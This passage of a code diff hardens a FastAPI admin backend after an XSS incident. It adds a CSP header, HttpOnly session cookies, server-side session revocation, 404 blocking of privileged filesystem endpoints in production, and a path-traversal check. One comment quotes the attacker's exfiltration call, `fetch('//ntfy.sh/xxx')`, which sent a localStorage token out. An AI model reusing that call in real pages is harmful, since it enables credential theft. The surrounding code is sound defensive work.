@@ -2,6 +2,7 @@
 import hashlib
 import logging
 import os
+import time
 from pathlib import Path
 
 from fastapi import Depends, FastAPI, Form, HTTPException, Request
@@ -14,9 +15,10 @@ from admin.config import settings
 from admin.db import SessionLocal, get_db, init_db, wait_database_ready
 from sqlalchemy.orm import Session
 from admin.models import SystemSetting
+from admin import env_guard, session_store
 from admin.routers import (accounts, credits, groups,
                            growth, keys, login as login_router, logs, models,
-                           proxy, schedules, stats, sync)
+                           proxy, proxies, schedules, stats, sync)
 from admin.ratelimit import (client_ip_from_request, clear_failures,
                              is_locked, record_failure)
 from admin.security import (
@@ -100,14 +102,27 @@ _DOCS_PATHS = {"/docs", "/docs/oauth2-redirect", "/redoc", "/openapi.json",
 app = FastAPI(title="WorkBuddy 共享管理后台", version="1.0",
               docs_url="/docs", redoc_url="/redoc", openapi_url="/openapi.json")
 
-# 生产启动断言：配置不合规就让进程起不来。
-#
-# 放在 app 创建之后、注册任何业务路由之前 —— 越早失败，越不会出现
-# 「服务已经监听端口、但策略没生效」的窗口。非 prod 环境只做最危险误配的
-# 拦截（绑公网 + 本机免密标志同时成立），不影响本地开发与测试。
-from admin import env_guard
-
+#: 生产启动断言：配置不合规就让进程起不来。
+#:
+#: 放在 app 创建之后、注册任何路由之前 —— 越早失败，越不会出现
+#: 「服务已经监听端口、但策略没生效」的窗口。
+#: 非 prod 环境本函数直接返回，不影响本地开发与测试。
 env_guard.assert_boot_policy()
+
+
+@app.middleware("http")
+async def _prod_block_privileged_paths(request: Request, call_next):
+    """生产环境把「任意文件系统 / 进程控制」类接口直接打成 404。
+
+    为什么在中间件层做，而不是依赖路由不挂载：
+      * 平台目录是可裁剪的，`include_router` 成败取决于一堆 try/except；
+        漏挂是"没这个功能"，误挂就是"把宿主机交出去"。
+      * 这里做的是**第二道闸**：即使路由被挂上、即使有人后来改了
+        `include_router` 的条件，生产也访问不到。
+    """
+    if env_guard.is_prod_blocked(request.url.path):
+        return JSONResponse(status_code=404, content={"detail": "Not Found"})
+    return await call_next(request)
 
 @app.get("/api/settings/invitation")
 def get_invitation_setting(_: bool = Depends(require_admin), db=Depends(get_db)):
@@ -146,21 +161,54 @@ app.add_middleware(
 
 
 @app.middleware("http")
-async def _security_headers(request: Request, call_next):
-    """统一安全响应头 + 生产高危路径拦截。
+async def _join_gate_middleware(request: Request, call_next):
+    """join 入口的统一门禁：没有有效访问 Cookie 一律 404。
 
-    ## 为什么高危路径在中间件层挡，而不是只依赖路由不挂载
+    覆盖 `/join` 与全部 `/api/join/*`，但**排除**三类：
+      * `/api/join/ticket/exchange` —— 它就是来换 Cookie 的；
+      * `/api/join/gate/*`         —— 后台总闸，自己要求管理员鉴权；
+      * `/api/join/invites*`       —— 后台邀请码管理，同上。
 
-      * 平台目录是可裁剪的，`include_router` 成败取决于一堆 try/except；
-        漏挂是「没这个功能」，误挂就是「把宿主机交出去」。
-      * 这里是**第二道闸**：即使路由被挂上、即使有人后来改了
-        `include_router` 的条件，生产也访问不到。
-
-    返回体与「页面不存在」完全一致 —— 不告诉探测者「这个能力存在，只是被禁了」。
+    返回体与"页面不存在"完全一致：不告诉探测者"入口存在但你没票"。
     """
+    path = request.url.path
+    is_join = (path in ("/join", "/join/", "/static/join.html")
+               or path.startswith("/api/join/"))
+    if is_join and not (
+        path == "/api/join/ticket/exchange"
+        or path.startswith("/api/join/gate/")
+        or path.startswith("/api/join/invites")
+    ):
+        try:
+            from admin import join_gate as _jg
+            with SessionLocal() as db:
+                allowed = _jg.check_access(db, request.cookies.get(_jg.COOKIE_NAME, ""))
+        except Exception:  # noqa: BLE001 - 数据库不可用时 fail-closed
+            allowed = False
+        if not allowed:
+            return JSONResponse(status_code=404, content={"detail": "Not Found"})
+    return await call_next(request)
+
+
+@app.middleware("http")
+async def _security_headers(request: Request, call_next):
+    """统一安全响应头：防点击劫持 / MIME 嗅探 / 敏感头泄露。"""
+    # OpenAPI 文档：默认关闭；**生产强制关闭**。
+    #
+    # 为什么不能只看 `settings.ENABLE_DOCS`：它可以在「运行配置」里被
+    # SystemSetting 覆盖成 1（`admin/runtime_settings.py` 把 ENABLE_DOCS
+    # 列为可调项）。生产如果允许一次点击就重新暴露完整攻击面清单，
+    # 启动断言那一条就形同虚设。
     if request.url.path in _DOCS_PATHS and (
             not settings.ENABLE_DOCS or env_guard.IS_PROD):
         return JSONResponse(status_code=404, content={"detail": "Not Found"})
+    #: 生产高危路径拦截（本仓保留）。
+    #:
+    #: 上游把这条判断放在 `_prod_block_privileged_paths` 里 —— 那个中间件
+    #: 注册得比本函数早，位置更靠内。这里**再判一次**，让拦截落在最外层：
+    #: 即使日后 `_join_gate_middleware` 之类的内层中间件出问题，
+    #: `/api/app-source`、`/api/client-paths` 这类「能读本机磁盘」的接口
+    #: 在生产也打不穿。代价只是一次前缀比较。
     if env_guard.is_prod_blocked(request.url.path):
         return JSONResponse(status_code=404, content={"detail": "Not Found"})
     response = await call_next(request)
@@ -169,6 +217,35 @@ async def _security_headers(request: Request, call_next):
     response.headers.setdefault("Referrer-Policy", "no-referrer")
     if request.url.path.startswith(("/api", "/admin")):
         response.headers.setdefault("Cache-Control", "no-store")
+    # 所有 HTML 文档统一下发 CSP。
+    #
+    # 2026-11-02 事故里，载荷执行后第一件事是把 localStorage 里的令牌
+    # `fetch('//ntfy.sh/xxx')` 外带。`connect-src 'self'` 直接掐死这条通道 ——
+    # 不管 XSS 有没有复发，数据都出不去。这是纵深防御里最便宜的一层。
+    #
+    # 保留 `'unsafe-inline'` 的原因：index.html 里有 120 个内联 onclick
+    # （历史包袱），一次性改成 addEventListener 风险太大；而 'unsafe-inline'
+    # 只放行内联代码，**不会**放行 chrome-extension:// 这类跨源 src。
+    # 我们自己没有任何 eval / new Function（已逐文件核查），故不需要 'unsafe-eval'。
+    _p = request.url.path
+    _is_html_doc = (
+        (_p.startswith("/admin") and not _p.startswith("/admin/assets"))
+        or _p in ("/join", "/join/", "/", "/j")
+        or (_p.startswith("/static/") and _p.endswith(".html"))
+    )
+    if _is_html_doc:
+        response.headers.setdefault(
+            "Content-Security-Policy",
+            "default-src 'self'; "
+            "script-src 'self' 'unsafe-inline'; "
+            "style-src 'self' 'unsafe-inline'; "
+            "img-src 'self' data: blob:; "
+            "font-src 'self' data:; "
+            "connect-src 'self'; "
+            "media-src 'self' blob:; "
+            "object-src 'none'; base-uri 'self'; "
+            "frame-ancestors 'none'; form-action 'self'",
+        )
     return response
 
 
@@ -214,22 +291,38 @@ async def _start_upstream_connections():
     if os.getenv("WORKBUDDY_ANDROID") == "1":
         from admin import upstream_http
         await upstream_http.start(app, proxy.HTTP_LIMITS)
-    # 套用「设置 → 运行配置」里保存的覆盖值（exe/apk 无 .env，全靠这）。
-    try:
-        from admin.db import SessionLocal
-        from admin.runtime_settings import apply_overrides
-        with SessionLocal() as db:
-            applied = apply_overrides(db)
-        if applied:
-            logging.getLogger("admin.server").info("运行配置已套用 %d 项覆盖", applied)
-    except Exception as exc:  # 库表尚未初始化等情况不影响启动
-        logging.getLogger("admin.server").warning("运行配置套用失败：%s", exc)
+    # 「设置 → 运行配置」的覆盖值不在这里套用：这个 startup 钩子注册在
+    # `_startup` 之前，此刻 init_db 还没跑，首次启动（尤其是全新安装的 APK）
+    # 必然撞上 `no such table: system_settings`，覆盖值要等到下次重启才生效。
+    # 套用动作已挪到 `_startup` 里 init_db 之后，见 `_apply_runtime_overrides`。
 
 
 @app.on_event("shutdown")
 async def _stop_upstream_connections():
     from admin import upstream_http
     await upstream_http.stop(app)
+
+
+@app.on_event("startup")
+async def _start_loop_watch():
+    # **必须是 async 启动钩子**：探针要记下「事件循环线程」的 ident，
+    # 同步钩子会被 Starlette 丢到线程池执行，记到的就是工作线程。
+    try:
+        from admin import loop_watch
+        # `start()` 是**同步**函数（内部用 get_running_loop().create_task
+        # 挂心跳协程），这里不能 await —— 它返回的是 bool。
+        loop_watch.start(app)
+    except Exception:  # noqa: BLE001 - 探针起不来不影响业务
+        logger.exception("事件循环探针启动失败（不影响服务）")
+
+
+@app.on_event("shutdown")
+async def _stop_loop_watch():
+    try:
+        from admin import loop_watch
+        await loop_watch.stop()
+    except Exception:  # noqa: BLE001
+        pass
 
 if os.getenv("WORKBUDDY_ANDROID") == "1":
     accounts.router.routes[:] = [route for route in accounts.router.routes
@@ -239,6 +332,7 @@ app.include_router(accounts.router)
 app.include_router(keys.router)
 app.include_router(models.router)
 app.include_router(proxy.router)
+app.include_router(proxies.router)
 app.include_router(audio.router)
 app.include_router(images.router)
 app.include_router(videos.router)
@@ -260,18 +354,14 @@ app.include_router(growth_center.router)
 app.include_router(ip_management.router)
 from admin.routers import client_profile
 app.include_router(client_profile.router)
-# 客户端路径手动指定（`install_paths` 的后台覆盖入口）。
-#
-# 自动发现按「固定目录名 + 动态盘符/父文件夹」定位，绝大多数机器直接能找到；
-# 但绿色版解压到极深目录、把 userData 迁到网络盘、或系统环境变量被改过时，
-# 仍需要用户手工指定一次。**没有这条路由，`install_paths.save()` 就没有
-# 任何调用方** —— 保存能力等于不存在。
-#
-# 安全：`env_guard.PROD_BLOCKED_PREFIXES` 已把 `/api/client-paths` 列为
-# 生产高危前缀（它能覆盖客户端安装目录 / 读本机磁盘），prod 下由中间件
-# 统一打成 404，与 `/api/app-source`、`/api/client-profile` 同等待遇。
+# 客户端路径：自动发现之外的手动指定（换盘 / 便携版 / userData 迁移）。
 from admin.routers import client_paths
 app.include_router(client_paths.router)
+# 浏览器端自检上报：控制台把 pageerror / 资源状态 / 注入痕迹 POST 回来，
+# 落 logs/client-diag.jsonl。用于定位「页面结构完全正常、使用者那边却报
+# SyntaxError 且按钮失灵」这类只在其本机环境复现的问题。
+from admin.routers import client_diag
+app.include_router(client_diag.router)
 # 多平台：平台元信息（控制台切换模块的唯一数据源）+ Trae 专属管理接口。
 from admin.platform.router import router as platforms_router
 app.include_router(platforms_router)
@@ -325,7 +415,24 @@ try:
     app.include_router(raccoon_accounts_router.router)
 except Exception:  # noqa: BLE001 - raccoon 目录被裁剪时降级为不挂载
     logger.exception("小浣熊管理接口挂载失败（其它功能不受影响）")
-if os.getenv("WORKBUDDY_ANDROID") != "1":
+try:
+    from admin.platform.codearts.routers import accounts as codearts_accounts_router
+    app.include_router(codearts_accounts_router.router)
+except Exception:  # noqa: BLE001 - codearts 目录被裁剪时降级为不挂载
+    logger.exception("CodeArts 管理接口挂载失败（其它功能不受影响）")
+try:
+    from admin.platform.minimax.routers import accounts as minimax_accounts_router
+    app.include_router(minimax_accounts_router.router)
+except Exception:  # noqa: BLE001 - minimax 目录被裁剪时降级为不挂载
+    logger.exception("MiniMax 管理接口挂载失败（其它功能不受影响）")
+try:
+    from admin.platform.wps_lingxi.routers import accounts as wps_lingxi_accounts_router
+    app.include_router(wps_lingxi_accounts_router.router)
+except Exception:  # noqa: BLE001 - wps_lingxi 目录被裁剪时降级为不挂载
+    logger.exception("WPS 灵犀管理接口挂载失败（其它功能不受影响）")
+if os.getenv("WORKBUDDY_ANDROID") != "1" and not env_guard.IS_PROD:
+    # 逆向产物管理（任意目录创建 + 递归读取）：**生产不挂载**。
+    # 中间件还有一道 404，双保险 —— 见 env_guard.PROD_BLOCKED_PREFIXES。
     from admin.routers import app_source
     app.include_router(app_source.router)
 app.include_router(login_router.router)
@@ -334,6 +441,9 @@ app.include_router(releases.router)
 # 让「发给朋友」这一诉求成立 —— 对方不需要知道后台口令。
 app.include_router(login_router.public_router)
 app.include_router(join_invites_router)
+# join 总闸：状态 / 开关 / 签发访问链接 + 公开的票据兑换端点。
+from admin.routers import join_gate as join_gate_api
+app.include_router(join_gate_api.router)
 
 
 @app.on_event("startup")
@@ -360,6 +470,14 @@ def _startup():
         if settings.ADMIN_USERNAME == "admin" and settings.ADMIN_PASSWORD == "admin123":
             logger.warning("仍在使用 admin/admin123 弱口令，且服务可能监听 0.0.0.0，请尽快更换")
 
+    # 环境画像：出问题时第一眼要能确认「这台到底是 prod 还是 dev」。
+    logger.info(
+        "运行环境 APP_ENV=%s prod=%s 会话单例=%s 设备绑定=%s CSRF=%s 文件系统运维=%s",
+        env_guard.APP_ENV, env_guard.IS_PROD,
+        settings.SESSION_SINGLE, settings.SESSION_BIND_DEVICE,
+        settings.CSRF_ENABLED, env_guard.fs_ops_allowed(),
+    )
+
     # 数据库不可用（例如 MySQL 被 OOM 杀掉正在重启）时**不能**让启动失败：
     # 这里抛异常会让 uvicorn 直接退出进程，nginx 侧变成 502，且需要人工重启。
     # 改为重试 + 降级启动，进程保持存活，数据库恢复后自动可用。
@@ -371,6 +489,19 @@ def _startup():
             logger.exception("建表/迁移失败，服务继续启动（数据库可用后重启即可）")
     else:
         logger.error("数据库当前不可用，服务以降级模式启动：请求将返回 503，恢复后自动自愈")
+
+    # 套用「设置 → 运行配置」里保存的覆盖值（exe/apk 没有 .env，全靠这）。
+    # 位置必须在 init_db 之后：首次启动时表还不存在，早跑一次只会打一条
+    # `no such table: system_settings` 的告警，然后覆盖值静默失效到下次重启。
+    if db_ok:
+        try:
+            from admin.runtime_settings import apply_overrides
+            with SessionLocal() as db:
+                applied = apply_overrides(db)
+            if applied:
+                logger.info("运行配置已套用 %d 项覆盖", applied)
+        except Exception as exc:  # 库表异常不影响启动
+            logger.warning("运行配置套用失败：%s", exc)
 
     # 装配流量治理运行态：在途租约上限、会话粘性路由（含后台 GC 线程）。
     # 这些是纯进程内存状态，**不需要数据库**，所以放在 db_ok 判定之外 ——
@@ -390,6 +521,14 @@ def _startup():
         )
     except Exception:
         logger.exception("号池运行态装配失败，将退化为无粘性/无在途限制")
+
+    # 后台预加载各平台的路径覆盖值（库查询约 0.3s，不能压在展示接口上）。
+    try:
+        from admin.platform import install_paths
+
+        install_paths.warmup()
+    except Exception:
+        logger.debug("客户端路径覆盖预热失败", exc_info=True)
 
     # 把后台保存的路径覆盖注入 wb_install（安装目录 / 逆向产物目录）。
     # 必须在下面「客户端版本发现」之前：否则首个请求拿到的还是扫描结果，
@@ -424,6 +563,12 @@ def _startup():
 
     # 调度器只在数据库可用时启动（否则它每 15s 都会失败一次，纯属噪音）
     if db_ok:
+        # 会话表清理：只删「过期超过 30 天」的历史行，活跃会话不受影响。
+        try:
+            with SessionLocal() as db:
+                session_store.purge(db)
+        except Exception:
+            logger.exception("清理历史会话失败（不影响启动）")
         from admin.scheduler import start_scheduler
         start_scheduler()
         try:
@@ -523,19 +668,132 @@ def login(
     # 密码正确：清空成对与 IP 全局计数（指纹维度也一并清，避免误伤后续正常登录）。
     clear_failures(ip, username, fingerprint)
     logger.info("后台登录成功 ip=%s fp=%s", ip, fingerprint or "-")
-    token = create_admin_token()
-    # 会话 Cookie：让浏览器后续的 /admin 文档请求能通过门禁拿到完整控制台。
-    # （API 调用仍走 X-Admin-Token；Cookie 只服务于页面下发，HttpOnly 不可被 JS 读取。）
-    response = JSONResponse({"token": token})
-    response.set_cookie(**_admin_cookie_params(request, settings.JWT_EXPIRE_HOURS * 3600), value=token)
+
+    # ---- 建会话 + 下发 HttpOnly Cookie（响应体里**不再返回 token**）----
+    #
+    # 为什么不返回：只要 token 出现在 JSON 里，前端就有机会把它塞进
+    # localStorage —— 那正是事故中令牌被 XSS 读走的原因。现在浏览器侧
+    # 唯一的有效副本是 HttpOnly Cookie，`document.cookie` 读不到，
+    # XSS 再复发也拿不走凭证。
+    device_id, new_device = _ensure_device_id(request)
+    token, session_row = _issue_admin_session(
+        request, ip=ip, fingerprint=fingerprint, device_id=device_id)
+
+    response = JSONResponse({
+        "ok": True,
+        "expires_in": settings.JWT_EXPIRE_HOURS * 3600,
+        # 会话标识只用于排障与「当前设备」展示，不是凭证。
+        "sid": session_row.sid[:8],
+    })
+    _attach_auth_cookies(response, request, token, device_id, new_device)
     return response
 
 
+def _ensure_device_id(request: Request) -> tuple[str, bool]:
+    """取设备标识 Cookie；没有就生成一枚。返回 (device_id, 是否新建)。"""
+    did = (request.cookies.get(session_store.DEVICE_COOKIE) or "").strip()
+    if len(did) >= 16:
+        return did, False
+    return session_store.new_device_id(), True
+
+
+def _issue_admin_session(request: Request, *, ip: str, fingerprint: str | None,
+                         device_id: str):
+    """签发一条新会话（并吊销该账号此前的全部会话）。"""
+    ttl = settings.JWT_EXPIRE_HOURS * 3600
+    sid = session_store.new_sid()
+    token = create_admin_token(sid)
+    db = SessionLocal()
+    try:
+        row = session_store.create_session(
+            db,
+            sid=sid,
+            subject=settings.ADMIN_USERNAME,
+            token=token,
+            ip=ip,
+            user_agent=request.headers.get("user-agent", "") if request else "",
+            fingerprint=fingerprint or "",
+            device_id=device_id if settings.SESSION_BIND_DEVICE else "",
+            ttl_seconds=ttl,
+            single=settings.SESSION_SINGLE,
+        )
+    finally:
+        db.close()
+    return token, row
+
+
+def _attach_auth_cookies(response, request: Request, token: str,
+                         device_id: str, new_device: bool) -> None:
+    """统一下发三枚 Cookie：会话（HttpOnly）、设备（HttpOnly）、CSRF（可读）。
+
+    * 会话 Cookie：真正的凭证。`SameSite=Lax` —— 从外部链接点进 `/admin`
+      这种顶层导航要能带上，`Strict` 会让"从收藏夹/文档点过来"变成未登录。
+    * 设备 Cookie：只做绑定，不承载权限；180 天，让"同一台浏览器"可识别。
+    * CSRF Cookie：**必须**允许 JS 读（双提交模式），`SameSite=Strict`。
+    """
+    https = _is_https(request)
+    max_age = settings.JWT_EXPIRE_HOURS * 3600
+    response.set_cookie(
+        key=session_store.SESSION_COOKIE, value=token, httponly=True,
+        samesite="lax", secure=https, path="/", max_age=max_age)
+    if new_device:
+        response.set_cookie(
+            key=session_store.DEVICE_COOKIE, value=device_id, httponly=True,
+            samesite="lax", secure=https, path="/",
+            max_age=max(86400, settings.DEVICE_COOKIE_DAYS * 86400))
+    csrf = request.cookies.get(session_store.CSRF_COOKIE) or session_store.new_csrf_token()
+    response.set_cookie(
+        key=session_store.CSRF_COOKIE, value=csrf, httponly=False,
+        samesite="strict", secure=https, path="/", max_age=max_age)
+
+
+def _clear_auth_cookies(response) -> None:
+    for name in (session_store.SESSION_COOKIE, session_store.CSRF_COOKIE):
+        response.delete_cookie(name, path="/")
+
+
+def _revoke_current_session(request: Request) -> bool:
+    """销毁这个请求所持凭证对应的会话行。返回是否真的吊销了一条。"""
+    token = (request.cookies.get(session_store.SESSION_COOKIE)
+             or request.headers.get("X-Admin-Token") or "")
+    if not token:
+        return False
+    db = SessionLocal()
+    try:
+        return session_store.revoke_by_token(db, token, "logout")
+    except Exception:  # noqa: BLE001 - 退出必须幂等，不能因为库抖动卡住用户
+        logger.exception("退出登录时吊销会话失败")
+        return False
+    finally:
+        db.close()
+
+
 @app.post("/api/login/logout")
+@app.post("/outlogin")
 def login_logout(request: Request):
-    """退出登录：清会话 Cookie（幂等，无需鉴权）。"""
-    response = JSONResponse({"ok": True})
-    response.delete_cookie(_ADMIN_COOKIE, path="/")
+    """**真实退出**：服务端销毁会话行，再清 Cookie。
+
+    与升级前的区别：原来只 `delete_cookie`，JWT 依旧有效 —— 谁在那之前
+    复制过 Cookie，退出之后照样能用到过期。现在 `revoked_at` 一落库，
+    同一张令牌在任何设备上都立刻失效。
+    """
+    revoked = _revoke_current_session(request)
+    logger.info("后台退出登录 revoked=%s", revoked)
+    response = JSONResponse({"ok": True, "revoked": revoked})
+    _clear_auth_cookies(response)
+    return response
+
+
+@app.get("/outlogin", include_in_schema=False)
+def outlogin_page(request: Request):
+    """浏览器地址栏直接访问的退出入口（GET 便于收藏/书签）。
+
+    只做「吊销当前会话 + 跳回登录页」；跨站 `<img>` 这类子资源请求不会被
+    浏览器带上 SameSite=Lax 的 Cookie，所以不会被静默踢下线。
+    """
+    _revoke_current_session(request)
+    response = RedirectResponse(url="/admin", status_code=303)
+    _clear_auth_cookies(response)
     return response
 
 
@@ -546,15 +804,16 @@ def login_session(request: Request, _: bool = Depends(require_admin)):
     cookie_token = request.cookies.get(_ADMIN_COOKIE) or ""
     if cookie_token and token:
         try:
-            verify_admin_token(token)
+            verify_admin_token(token, request=request)
         except HTTPException:
             # require_admin may have accepted the newer cookie after an old
             # localStorage token failed; do not overwrite it with the stale one.
             token = cookie_token
     elif not token:
         token = cookie_token
+    device_id, new_device = _ensure_device_id(request)
     response = JSONResponse({"ok": True})
-    response.set_cookie(**_admin_cookie_params(request, settings.JWT_EXPIRE_HOURS * 3600), value=token)
+    _attach_auth_cookies(response, request, token, device_id, new_device)
     return response
 
 
@@ -564,11 +823,13 @@ class PasswordChangeIn(BaseModel):
 
 
 @app.patch("/api/admin/password")
-def change_password(body: PasswordChangeIn, _: bool = Depends(require_admin)):
+def change_password(body: PasswordChangeIn, request: Request,
+                    _: bool = Depends(require_admin)):
     if not verify_password(body.old_password, _get_stored_hash()):
         raise HTTPException(status_code=403, detail="当前密码不正确")
     if len(body.new_password) < 6:
         raise HTTPException(status_code=400, detail="新密码长度不能少于 6 位")
+    revoked = 0
     db = SessionLocal()
     try:
         row = db.query(SystemSetting).filter(SystemSetting.key == "admin_password").first()
@@ -577,9 +838,20 @@ def change_password(body: PasswordChangeIn, _: bool = Depends(require_admin)):
         else:
             db.add(SystemSetting(key="admin_password", value=hash_password(body.new_password)))
         db.commit()
+        # 改密意味着「此前所有凭证都视为可能已泄露」：吊销全部会话，
+        # 只留当前这一条（否则用户改完密码自己也被踢出去，体验很怪）。
+        try:
+            from admin.security import decode_admin_token
+            current = request.cookies.get(session_store.SESSION_COOKIE) or ""
+            sid = decode_admin_token(current).get("sid") if current else None
+        except Exception:  # noqa: BLE001
+            sid = None
+        revoked = session_store.revoke_all(
+            db, settings.ADMIN_USERNAME or "", "password_changed", except_sid=sid)
+        logger.warning("后台密码已修改，吊销其它会话 %d 条", revoked)
     finally:
         db.close()
-    return {"ok": True}
+    return {"ok": True, "revoked_sessions": revoked}
 
 
 @app.get("/")
@@ -595,8 +867,19 @@ _ADMIN_COOKIE = "admin_session"
 
 
 def _local_runtime() -> bool:
-    return (os.getenv("WORKBUDDY_DESKTOP") == "1"
-            or os.getenv("WORKBUDDY_ANDROID") == "1")
+    """本机客户端运行时。**生产恒 False**（见 admin/env_guard.py）。
+
+    升级前这里是直接读 `WORKBUDDY_DESKTOP` / `WORKBUDDY_ANDROID` 环境变量，
+    而 `_console_allowed()` 在命中时**不做任何 Cookie/JWT 校验**就直接下发
+    完整控制台。生产 `.env` 只要误带一个变量（从本地配置整体拷过来很常见），
+    `/admin` 与 `/admin/assets/*` 就整体裸奔 —— 这是事故报告里 R2。
+    """
+    return env_guard.local_runtime()
+
+
+def _is_https(request: Request) -> bool:
+    return (request.url.scheme == "https"
+            or (request.headers.get("x-forwarded-proto") or "").lower() == "https")
 
 
 def _console_allowed(request: Request) -> bool:
@@ -605,15 +888,16 @@ def _console_allowed(request: Request) -> bool:
         return True
     from admin.security import verify_admin_token
     try:
-        verify_admin_token(request.cookies.get(_ADMIN_COOKIE))
+        verify_admin_token(request.cookies.get(_ADMIN_COOKIE), request=request,
+                           require_bind=settings.SESSION_BIND_DEVICE)
         return True
     except Exception:
         return False
 
 
 def _admin_cookie_params(request: Request, max_age: int):
-    https = (request.url.scheme == "https"
-             or request.headers.get("x-forwarded-proto") == "https")
+    """保留给旧调用点：会话 Cookie 的参数（设备/CSRF Cookie 见 _attach_auth_cookies）。"""
+    https = _is_https(request)
     return dict(key=_ADMIN_COOKIE, httponly=True, samesite="lax",
                 secure=https, path="/", max_age=max_age)
 
@@ -630,14 +914,153 @@ def admin_index(request: Request):
                                 headers={"Cache-Control": "no-store, no-cache, must-revalidate"})
         return HTMLResponse(_console_shell(index),
                             headers={"Cache-Control": "no-store, no-cache, must-revalidate"})
+    # 登录页本身不引用任何外部资源（脚本全内联），没有 `?v=` 可打，
+    # 继续用 FileResponse 发原文件即可。
     return FileResponse(STATIC_DIR / "login.html",
                         headers={"Cache-Control": "no-store, no-cache, must-revalidate"})
+
+
+def _stamped_page(path) -> str:
+    """读一个小页面并把资源 `?v=` 换成内容哈希（注册页用）。
+
+    注册页直接引用 `/static/phone-session.js` 与 `phone-region.css`，
+    而且**原本一个版本号都没写** —— 换了内容照样被浏览器缓存。
+    文件只有几十 KB，每次读一遍不值得做缓存。
+    """
+    try:
+        return stamp_asset_urls(_read_console_html(path))
+    except OSError:
+        return ""
 
 
 #: 控制台 HTML 的内存缓存：键为 (绝对路径, mtime, 大小)。
 #: 每次请求都读 500KB 文件再拼字符串是纯浪费，而这份文件在进程生命周期内
 #: 基本不变（升级会重启进程）。
+#: 注意缓存的是**原始** HTML：资源 `?v=` 每次下发时按当前内容重新盖章
+#: （见 stamp_asset_urls），所以改了 js/css 不必重启、也不必清这个缓存。
 _CONSOLE_SHELL_CACHE: dict = {}
+
+
+# ---------------------------------------------------------------------------
+# 资源版本号：**按内容自动算**，不再手工改 `?v=`
+# ---------------------------------------------------------------------------
+#
+# 以前每个静态资源（console-app.js / console.css / 各面板脚本）的 URL 上都写死
+# 一个 `?v=20261105-ui9` 之类的串，改完代码要**记得**手工加版本，忘了就是
+# 「改了没生效，用户看到的是缓存里的旧文件」，而且一次改动往往要连改
+# index.html 里十几处、还得跟打包脚本对齐。
+#
+# 现在统一由服务端在**下发 HTML 时**把 `/admin/assets/*` 与 `/static/*` 的
+# `?v=` 换成该文件内容的哈希前 10 位：
+#   · 内容不变 → URL 不变 → 浏览器缓存继续命中（不会每次刷新都重下）；
+#   · 内容变了 → URL 变了 → 立刻失效，**不可能忘**；
+#   · 打包/源码/dev 三种情况走同一条代码路径，不需要 build 里再插一步。
+#
+# 代价：每个资源**第一次**被引用时读一遍算哈希（console-app.js 780KB ≈ 2ms），
+# 之后按 (mtime_ns, size) 命中缓存 —— 只有文件真的变了才重算。
+# 内容哈希的 URL 天生可以长缓存，所以这里按「一个文件」算，不做全目录扫描。
+#: 绝对路径 → (mtime_ns, size, 内容哈希前 10 位)
+_ASSET_DIGEST_CACHE: dict = {}
+#: URL 路径 → 磁盘文件。`Path.resolve()` 在 Windows 上要问文件系统，
+#: 一屏 40 个资源引用点每个都 resolve 两次就是几十毫秒 —— 缓存住。
+_ASSET_PATH_CACHE: dict = {}
+_ASSET_REF_RE = None         # 懒编译
+
+
+def _asset_roots() -> list:
+    """参与版本化的资源根目录：`/admin/assets/` 与 `/static/`。"""
+    return [("/admin/assets/", CONSOLE_DIR), ("/static/", STATIC_DIR)]
+
+
+def _asset_file_of(url_path: str):
+    """URL 路径 → 磁盘文件（越界或不存在返回 None）。
+
+    只认 `/admin/assets/...` 与 `/static/...`；`/admin`、`/join` 这类页面路由
+    原样返回 None，因此不会被误加 `?v=`。
+    """
+    if url_path in _ASSET_PATH_CACHE:
+        return _ASSET_PATH_CACHE[url_path]
+    resolved = None
+    for prefix, root in _asset_roots():
+        if not url_path.startswith(prefix):
+            continue
+        relative = url_path[len(prefix):]
+        if not relative or relative.endswith("/"):
+            break
+        try:
+            base = root.resolve()
+            target = (base / relative).resolve()
+        except OSError:
+            break
+        if target != base and not str(target).startswith(str(base) + os.sep):
+            break            # `../` 穿越，绝不返回
+        if target.is_file():
+            resolved = target
+        break
+    _ASSET_PATH_CACHE[url_path] = resolved
+    return resolved
+
+
+def _hash_file(path: Path) -> str:
+    digest = hashlib.sha1()
+    try:
+        with open(path, "rb") as handle:
+            for chunk in iter(lambda: handle.read(262144), b""):
+                digest.update(chunk)
+    except OSError:
+        # 读不到（并发删 / 权限）就退回时间戳，至少 URL 还能区分新旧
+        try:
+            return "t%x" % int(path.stat().st_mtime)
+        except OSError:
+            return ""
+    return digest.hexdigest()[:10]
+
+
+def asset_digest(path) -> str:
+    """单个资源文件的内容哈希（带 (mtime, size) 缓存）。
+
+    文件内容一变就换 URL —— 这就是「再也不用记着手改 `?v=`」的全部机制。
+    """
+    try:
+        path = Path(path)
+        stat = path.stat()
+    except OSError:
+        return ""
+    cached = _ASSET_DIGEST_CACHE.get(str(path))
+    if cached and cached[0] == stat.st_mtime_ns and cached[1] == stat.st_size:
+        return cached[2]
+    digest = _hash_file(path)
+    _ASSET_DIGEST_CACHE[str(path)] = (stat.st_mtime_ns, stat.st_size, digest)
+    return digest
+
+
+def _asset_version_of(url_path: str) -> str:
+    target = _asset_file_of(url_path)
+    return asset_digest(target) if target is not None else ""
+
+
+def stamp_asset_urls(html: str) -> str:
+    """把 HTML 里 `/admin/assets/*` 与 `/static/*` 的 `?v=` 换成内容哈希。
+
+    只动 `src=` / `href=` 的属性值，且只动以 `/` 开头的同源路径 ——
+    外链、`data:`、`#anchor`、页面路由（`/admin`、`/join`）一律原样。
+    """
+    import re as _re
+
+    global _ASSET_REF_RE
+    if _ASSET_REF_RE is None:
+        _ASSET_REF_RE = _re.compile(r'\b(src|href)="(/[^"]*)"')
+    pattern = _ASSET_REF_RE
+
+    def replace(match):
+        attr, url = match.group(1), match.group(2)
+        core = url.split("#", 1)[0].split("?", 1)[0]
+        version = _asset_version_of(core)
+        if not version:
+            return match.group(0)
+        return '%s="%s?v=%s"' % (attr, core, version)
+
+    return pattern.sub(replace, html)
 
 
 def _console_shell(path) -> str:
@@ -655,32 +1078,77 @@ def _console_shell(path) -> str:
     因此没有 JS 或会话过期时行为与原来一致。
     """
     stat = path.stat()
+    # 缓存的是**原始** HTML（读盘 + 完整性校验最贵）；盖章放在缓存之外，
+    # 这样改了 js/css 不用重启进程、也不用等缓存过期。
     key = (str(path), stat.st_mtime_ns, stat.st_size)
-    cached = _CONSOLE_SHELL_CACHE.get(key)
-    if cached is not None:
-        return cached
-    html = path.read_text(encoding="utf-8")
+    html = _CONSOLE_SHELL_CACHE.get(key)
+    if html is None:
+        html = _read_console_html(path)
+        if _console_html_complete(html):
+            _CONSOLE_SHELL_CACHE.clear()
+            _CONSOLE_SHELL_CACHE[key] = html
